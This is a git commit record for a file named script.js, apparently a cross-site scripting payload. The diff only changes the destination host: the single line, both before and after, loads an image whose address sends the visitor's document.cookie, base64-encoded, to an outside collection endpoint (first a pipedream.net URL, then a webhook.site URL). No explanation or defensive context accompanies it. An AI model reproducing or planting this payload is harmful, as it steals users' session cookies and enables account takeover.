5f779d980df078bd0ab2566b0d74b82293bdcf8c
jondaveyan <jon.daveyan@gmail.com>
2024-04-17 15:43:41 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://eo701wwoc4t6b3g.m.pipedream.net?data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/58542a94-0a19-492c-ab4c-b138a16217c1?data='+btoa(document.cookie);
